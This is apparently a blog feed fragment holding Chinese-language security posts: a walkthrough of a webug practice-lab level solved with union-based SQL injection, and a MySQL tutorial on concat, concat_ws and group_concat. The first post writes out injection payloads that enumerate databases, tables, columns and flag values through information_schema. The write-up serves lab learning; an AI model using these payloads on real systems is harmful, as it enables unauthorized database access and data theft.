      <title>webug之布尔注入</title>
      <link href="/blog/2019/07/27/websec/sql_injection/boolean_based_of_webug/"/>
      <url>/blog/2019/07/27/websec/sql_injection/boolean_based_of_webug/</url>
      
        <content type="html"><![CDATA[<h1 id="基于布尔的盲注简介"><strong>基于布尔的盲注简介</strong></h1><p><strong>Web 的页面的仅仅会返回 True 和 False两种状态</strong>，对咱们来说，也就是正常和不正常。当然，这个不正常的是怎么不正常，样子就多了。比如：网页中的某处缺少一块元素，某些位置不能正常显示等。</p><p>那么布尔盲注就是进行 SQL 注入之后然后根据页面返回的 True 或者是 False（也是就是页面是否显示正常）来得到数据库中的相关信息。</p><p>就先介绍这些基础知识，便于我们注入的时候判断是不是布尔</p><h2 id="检测注入点">检测注入点</h2><h3 id="单引号测试">单引号测试</h3><p>测试后，我们发现</p><blockquote><p>站长下载()是中国最大的站长类资源下载网站，提供最新最全的源码和站长类工具下载，专设源码报导栏目提供权威的源码评测和教程，推荐国内外优秀源码。</p></blockquote><p>相较于 id = 1正常显示页面，我们加单引号之后，这一段文字没有了，即：页面显示不正常了。</p><h3 id="注释测试">注释测试</h3><p>?id=1' --+ 页面显示正常</p><p>由此，我们得出两点：</p><ol type="1"><li>没有报错提示，只有显示正常与不正常。基于我们对布尔盲注的认识，我们认为这可能是布尔盲注。</li><li>这里我们猜测是字符型的 id = '1'</li></ol><p>如果不确定的话，我们还可以进行一下测试</p><ol type="1"><li>用双引号测试，又发现正常显示。（我们也不必着急去猜测 sql查询语句，因为没有报错，没办法猜。）</li><li>id = -1，显示不正常</li></ol><p>在我们仍不确定是否是布尔盲注的时候，我们接着按照回显注入的流程进行</p><h2 id="order-by-猜字段">order by 猜字段</h2><p>首先在猜字段的过程中，页面没有任何报错，只有正常与正常显示。order by2 时，显示正常，order by 3 时，显示不正常。故字段数为 2</p><h2 id="确定显示位">确定显示位</h2><p>?id=1' union select 1,2 --+</p><p>我们突然发现第二个字段是个显示位，就上面说的时不时消失的那段话的尾部。</p><p>嗯，本来想讲布尔盲注的，看来 webug 的这个题设置的也不好 emm。</p><p>其实前期，页面不报错，只有正常与不正常显示，是布尔盲注的一大特定。但这也不经意交给我们一个道理：不要完全相信经验（那些特征等），只有根据实际情况，才能做出最佳的判断，回显注入可比布尔盲注轻松多了。</p><h2 id="爆版本等信息">爆版本等信息</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; union select 1,concat_ws(&#x27;</span>, <span class="string">&#x27;,version(),database(),user(),@@datadir,@@version_compile_os) --+</span></span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,concat_ws(&#x27;</span>, <span class="string">&#x27;,version(),database(),user(),@@datadir,@@version_compile_os) --+</span></span><br></pre></td></tr></table></figure><p>从这里我们知道 id = 1 查询的就是那段话。 回显：5.5.53, webug,root@localhost, C:, Win32</p><h2 id="爆库名">爆库名</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(schema_name) from information_schema.schemata --+</span></span><br></pre></td></tr></table></figure><p>回显：information_schema,challenges,mysql,performance_schema,security,webug,webug_sys,webug_width_byte</p><h2 id="爆-webug-库中的表">爆 webug 库中的表</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>webug<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p>回显：data_crud,env_list,env_path,flag,sqlinjection,user,user_test</p><h2 id="爆-flag-表的字段名">爆 flag 表的字段名</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flag<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p>回显：id,flag</p><p>虽然之前回显注入那一关, 就是用的这个库里面的 flag,我还是义无反顾地爆了这个表的内容 emm(不知道当时怎么想的...)</p><h3 id="爆表中的数据">爆表中的数据</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(concat_ws(&#x27;</span>, <span class="string">&#x27;,id,flag) SEPARATOR &#x27;</span>;<span class="string">&#x27;) from flag --+</span></span><br></pre></td></tr></table></figure><p>回显：1, dfafdasfafdsadfa</p><p>提交 flag 果然不对.</p><h2 id="爆-sqlinjection-表的字段名">爆 sqlinjection 表的字段名</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>sqlinjection<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p>回显：id,content,id,content 奇怪，列名还能重复？？？经过查证, webug里面有两个 sqlinjection 表，另一个表在 webug_width_byte 库中，该表也有id，content 两个字段，<strong>经验教训：爆字段名时，将库名和表名都要指定，避免出现不同库出现相同表的原因。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>webug<span class="string">&#x27; and table_name=&#x27;</span>sqlinjection<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><h3 id="爆表中的数据-1">爆表中的数据</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(concat_ws(&#x27;</span>, <span class="string">&#x27;,id,content) separator &#x27;</span>; <span class="string">&#x27;) from sqlinjection --+</span></span><br></pre></td></tr></table></figure><p>内容: 1, 站长下载....优秀源码。; 2, hello</p><p>又没有 flag</p><h2 id="爆-data_crud-表的字段名">爆 data_crud 表的字段名</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>data_crud<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p>回显: id,name,age,email,gender</p><p>看着不像 flag</p><h2 id="换表-env_list">换表: env_list</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>env_list<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p>回显:id,envName,envDesc,envIntegration,delFlag,envFlag,level,type</p><h3 id="爆-delflag-和-envflag-字段内容">爆 delFlag 和 envFlag字段内容</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(concat_ws(&#x27;</span>, <span class="string">&#x27;,delFlag,envFlag) separator &#x27;</span>; <span class="string">&#x27;) from env_list --+</span></span><br></pre></td></tr></table></figure><p>回显了一堆呀: 0, dfafdasfafdsadfa; 0, fdsafsdfa; 0, gfdgdfsdg; 0,dsfasdczxcg; 0, safsafasdfasdf; 0, dfsadfsadfas; 0, ddfasdfsafsadfsd; 0,; 0, fsdafasdfas; 0, asdfsdfadfsdrew; 0, htryyujryfhyjtrjn; 0,uoijkhhnloh; 0, poipjklkjppoi; 0; 0, sadfvgsadfhe; 0, poiplmkounipoj; 0,sadfsadfsdadf; 0, sdfasdfgfddst; 0, vnghuytiuygui; 0, sadfhbvjyyiyukuyt;0, vbchjgwestruyi; 0; 0; 0; 0; 0; 0; 0; 0; 0</p><p>看来 delFlag 好多是 0, 还是不看它了.</p><p>简化一下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(envFlag separator &#x27;</span>; <span class="string">&#x27;) from env_list group by delFlag --+</span></span><br></pre></td></tr></table></figure><p>回显:</p><p>dfafdasfafdsadfa; sadfsadfsdadf; sdfasdfgfddst; vnghuytiuygui;sadfhbvjyyiyukuyt; vbchjgwestruyi; poiplmkounipoj; sadfvgsadfhe;fdsafsdfa; gfdgdfsdg; dsfasdczxcg; safsafasdfasdf; dfsadfsadfas;ddfasdfsafsadfsd; ; fsdafasdfas; asdfsdfadfsdrew; htryyujryfhyjtrjn;uoijkhhnloh; poipjklkjppoi</p><p>这么一堆 flag 难道是 webug 所有的 flag? 瞬间开心,一个个试,试出fdsafsdfa 为布尔注入这一关的 flag.</p><p>至此, 不小心发现的使用回显注入的布尔注入题目完结.</p><p>布尔注入我还是再找一个别的注入点写吧.</p><h1 id="总结回顾">总结回顾</h1><ol type="1"><li>在进行注入点测试之前，先大致看一下页面，这样如果是布尔盲注，可以在测试时，快速发现,当然,如果前期有些特征,不要着急用布尔盲注,可以先试试回显注入。</li><li><strong>爆字段名时，将库名和表名都要指定，避免出现不同库出现相同表的原因。</strong></li></ol>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql中concat相关函数详解</title>
      <link href="/blog/2019/07/25/websec/sql_injection/about_concat_func_of_mysql/"/>
      <url>/blog/2019/07/25/websec/sql_injection/about_concat_func_of_mysql/</url>
      
        <content type="html"><![CDATA[<h2 id="concat">concat</h2><ol type="1"><li><p>单纯连接字符串</p><p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="string">&#x27;MySQL &#x27;</span> <span class="string">&#x27;String &#x27;</span> <span class="string">&#x27;Concatenation&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------+</span></span><br><span class="line"><span class="operator">|</span> MySQL                      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------+</span></span><br><span class="line"><span class="operator">|</span> MySQL String Concatenation <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------+</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> concat(<span class="string">&#x27;MySQL &#x27;</span> <span class="string">&#x27;String &#x27;</span> <span class="string">&#x27;Concatenation&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> concat(<span class="string">&#x27;MySQL &#x27;</span> <span class="string">&#x27;String &#x27;</span> <span class="string">&#x27;Concatenation&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> MySQL String Concatenation                 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------+</span></span><br></pre></td></tr></table></figure></p></li><li><p>select 查询时，连接字段的值。</p><p>当然，如果你在字段中间再连接上空格或逗号，也就相当于加了分隔符。</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat(username, &#x27;,&#x27;,&#x27;passwd&#x27;) from tuser;</span><br><span class="line">+--------------------------------+</span><br><span class="line">| concat(username, &#x27;,&#x27;,&#x27;passwd&#x27;) |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| admin,passwd                   |</span><br><span class="line">| adam,passwd                    |</span><br><span class="line">| bob,passwd                     |</span><br><span class="line">| colin,passwd                   |</span><br><span class="line">| doc,passwd                     |</span><br><span class="line">| doctor,passwd                  |</span><br><span class="line">| elite,passwd                   |</span><br><span class="line">| admin,passwd                   |</span><br><span class="line">| adam,passwd                    |</span><br><span class="line">| bob,passwd                     |</span><br><span class="line">| colin,passwd                   |</span><br><span class="line">+--------------------------------+</span><br></pre></td></tr></table></figure></p><p>concat 和 concat_ws可以发挥差不多的功能，只是要连接的字段比较多时，使用 concat你就要手写多个分隔符，使用 concat_ws 写一个就行了。</p><p>注：你现在查询看着每一条记录都是有换行的，但是 sql注入的时候，就没有了，那样上一行后面与这一行的前面就接上了，这样来看，group_concat这个不仅可以分组连接字符串，还可以用来分隔每条记录数据的函数变很好了。三种函数具体使用自己体会吧。</p></li></ol><h2 id="concat_ws">concat_ws</h2><p>concat with separator 带有分隔符的字符串连接。</p><p>CONCAT<em>WS(_separator</em>, <em>expression1</em>,<em>expression2</em>, *...)</p><h2 id="group_concat-函数">group_concat 函数</h2><p>这里将讲解如何使用几种选项来连接一个组中的字符串。（没事，相信你也不懂这句话，那就对了，要不看这篇文章干什么。）</p><h3 id="简介">简介</h3><p>The MySQL <code>GROUP_CONCAT</code> function concatenates stringsfrom a group into a single string with various options.</p><p>mysql 中的 group_concat函数通过使用一些选项将一个组中的数据连接成一个默认以逗号分隔的字符串。</p><p>起初，感觉这个组是个什么东西，好抽象，难道 group_concat 只能和 groupby 一起使用吗？直到写这篇文章查资料才清楚。</p><p>当你使用 group by 时， 这个组的概念，当然就是，按照你 group by字段分的组了。当你未使用 group by 时， 也是可以使用 group_concat的，而此时，这个组便是所有的记录，它就直接将所有记录中的这个字段，用指定的分割符，连接成一个字符串。</p><p>在 mysql 控制台输入命令：help group_concat;</p><blockquote><p>The full syntax is as follows:</p><p>GROUP_CONCAT([DISTINCT] expr [,expr ...]ORDER BY {unsigned_integer |col_name | expr} [ASC | DESC][,col_name ...]] [SEPARATOR str_val])</p></blockquote><p>注：[] 方括号是可选的，可写可不写，｛｝大括号是要写的，[]中有｛｝的话，那就是如果你要使用 []中的那个选项，｛｝中的内容必须写。</p><p>可以看出，三个子句只有第一个子句是写的，也就是至少指定你要进行组字符串连接的字段名。</p><p>简单版：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GROUP_CONCAT(<span class="keyword">DISTINCT</span> expression</span><br><span class="line">    <span class="keyword">ORDER</span> <span class="keyword">BY</span> expression</span><br><span class="line">    SEPARATOR sep);</span><br></pre></td></tr></table></figure><p>注意：group_concat中的三个子句/选项中间使用的是空格分隔符，不要加逗号什么的。</p><p>先看一下我们准备用来做例子的表的数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tuser;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> username <span class="operator">|</span> passwd   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> admin    <span class="operator">|</span> basswd   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> adam     <span class="operator">|</span> vassword <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> bob      <span class="operator">|</span> gasswd   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span> colin    <span class="operator">|</span> passwd   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span> doc      <span class="operator">|</span> passwd   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span> doctor   <span class="operator">|</span> passwd   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span> elite    <span class="operator">|</span> passwd   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> admin    <span class="operator">|</span> basswd   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> adam     <span class="operator">|</span> vassword <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> bob      <span class="operator">|</span> gasswd   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span> colin    <span class="operator">|</span> passwd   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+</span></span><br><span class="line"><span class="number">11</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>单独使用 group_concat，不使用 group by 时，将每个记录中 username字段的值都连接成一个字符串，并使用默认分隔符：逗号。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="title function_ invoke__">group_concat</span>(username) <span class="keyword">from</span> tuser;</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| <span class="title function_ invoke__">group_concat</span>(username)                                     |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| admin,adam,bob,colin,doc,doctor,elite,admin,adam,bob,colin |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line"><span class="number">1</span> row in <span class="title function_ invoke__">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h3 id="distinct-子句">DISTINCT 子句</h3><p>在 group_concat 将组中值连接成字符串之前，去除组中重复的值。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> group_concat(<span class="keyword">distinct</span> username) <span class="keyword">from</span> tuser;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> group_concat(<span class="keyword">distinct</span> username)       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> adam,admin,bob,colin,doc,doctor,elite <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h3 id="order-by-子句">ORDER BY 子句</h3><p>这个你应该比较清楚，就是按照指定的字段（必须指定字段），递增或递减排序，默认是递增的，也可以手动设置，跟sql 语句中学的 order by 没什么区别。</p><p>The <code>SEPARATOR</code> specifies a literal value inserted betweenvalues in the group. If you do not specify a separator, the<code>GROUP_CONCAT</code> function uses a comma (,) as the defaultseparator.</p><p>SEPARATOR 子句</p><p>指定字符串连接各值时的分隔符，如果不写此子句，默认分隔符是逗号（comma）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> group_concat(<span class="keyword">distinct</span> username separator <span class="string">&#x27;;&#x27;</span>) <span class="keyword">from</span> tuser;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> group_concat(<span class="keyword">distinct</span> username separator <span class="string">&#x27;;&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> adam;admin;bob;colin;doc;doctor;elite         <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>GROUP_CONCAT 函数忽略 NULL 值，如果没有匹配的行或者所有的值都是NULL，它将会返回 NULL。</p><p>GROUP_CONCAT根据变量/值来返回二进制/非二进制字符串。（这句话的意思就是咱不用管它），默认情况下，返回字符串的最大长度为1024. 如果要需要返回更长的话，可以通过在 会话级（session） 或全局（global）设置系统变量：group_concat_max_len 来增大长度。</p><h3 id="常见错误">常见错误</h3><p>group_concat 函数返回的是一个字符串，而不是一个数组或链表，这就意味着你不能够在子查询时，通过in 运算符使用 group_concat 的结果。</p><h1 id="group_concat-与-group-by-搭配">group_concat 与 group by搭配</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> group_concat(<span class="keyword">distinct</span> username <span class="keyword">order</span> <span class="keyword">by</span> id <span class="keyword">desc</span> separator <span class="string">&#x27;;&#x27;</span>) <span class="keyword">from</span> tuser <span class="keyword">group</span> <span class="keyword">by</span> id;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> group_concat(<span class="keyword">distinct</span> username <span class="keyword">order</span> <span class="keyword">by</span> id <span class="keyword">desc</span> separator <span class="string">&#x27;;&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> bob;adam;admin                                                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> doc;colin                                                      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> elite;doctor                                                   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------------------------------------------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>当然，你也可以使用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id group_concat(<span class="keyword">distinct</span> username <span class="keyword">order</span> <span class="keyword">by</span> id <span class="keyword">desc</span> separator <span class="string">&#x27;;&#x27;</span>) <span class="keyword">from</span> tuser <span class="keyword">group</span> <span class="keyword">by</span> id;</span><br></pre></td></tr></table></figure><p>这样的结果，更直观，我使用没有 id，就是想让你知道，order by字段名的话，可以根据没有查询的字段名进行排序，但是 order by数字（即：用数字代替字段）的话，数字对应前面 select 查询的列（从 1到列的个数）。</p><h1 id="group_concat-与-concat_ws-搭配">GROUP_CONCAT 与 CONCAT_WS搭配</h1><p>在进行 sql查询时，二者搭配食用最佳。适用于你需要字符串连接多个数据时，使用concat_ws 使用一种分隔符将一条记录中的不同字段对应数据项分隔开，然后group_concat 使用另一种分隔符，将不同记录的数据分隔开。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> group_concat(concat_ws(<span class="string">&#x27;,&#x27;</span>,username,passwd) <span class="keyword">order</span> <span class="keyword">by</span> id <span class="keyword">desc</span> separator <span class="string">&#x27;; &#x27;</span>) <span class="keyword">from</span> tuser <span class="keyword">group</span> <span class="keyword">by</span> id;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> group_concat(concat_ws(<span class="string">&#x27;,&#x27;</span>,username,passwd) <span class="keyword">order</span> <span class="keyword">by</span> id <span class="keyword">desc</span> separator <span class="string">&#x27;; &#x27;</span>)     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> bob,gasswd; adam,vassword; admin,basswd; bob,gasswd; adam,vassword; admin,basswd <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> colin,passwd; doc,passwd; colin,passwd                                           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> elite,passwd; doctor,passwd                                                      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>记一个自己犯的小错误：</p><p>mysql insert 的时候报错，ERROR 1054 (42S22): Unknown column 'admin'in 'field list'</p><p>一般是字段类型与你插入的不一致造成的，而这又常常是因为，字符串没有加单引号造成的。</p><p>此外，三者还有一个不太一样的地方：concat 和 group_concat函数在连接字符串时，只要其中有一个是 null，那么就返回 null。而 concat_ws函数则不会这样，他会忽略 null。</p><p>测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat(&#x27;hello&#x27;,null,&#x27;null&#x27;);</span><br><span class="line">+-----------------------------+</span><br><span class="line">| concat(&#x27;hello&#x27;,null,&#x27;null&#x27;) |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| NULL                        |</span><br><span class="line">+-----------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select concat_ws(&#x27;;&#x27;,&#x27;hello&#x27;,null,&#x27;world&#x27;);</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| concat_ws(&#x27;;&#x27;,&#x27;hello&#x27;,null,&#x27;world&#x27;) |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| hello;world                         |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select group_concat(&#x27;hello&#x27;,null,&#x27;world&#x27;);</span><br><span class="line">+------------------------------------+</span><br><span class="line">| group_concat(&#x27;hello&#x27;,null,&#x27;world&#x27;) |</span><br><span class="line">+------------------------------------+</span><br><span class="line">| NULL                               |</span><br><span class="line">+------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h1 id="参考资料">参考资料</h1><blockquote><ul><li><a href="http://www.mysqltutorial.org/mysql-group_concat/">MySQLGROUP_CONCAT Function</a></li><li><ahref="http://www.mysqltutorial.org/sql-concat-in-mysql.aspx">MySQLCONCAT Function</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli_lib之less1</title>
      <link href="/blog/2019/07/25/websec/sql_injection/less1_of_sqli-lib/"/>
      <url>/blog/2019/07/25/websec/sql_injection/less1_of_sqli-lib/</url>
      
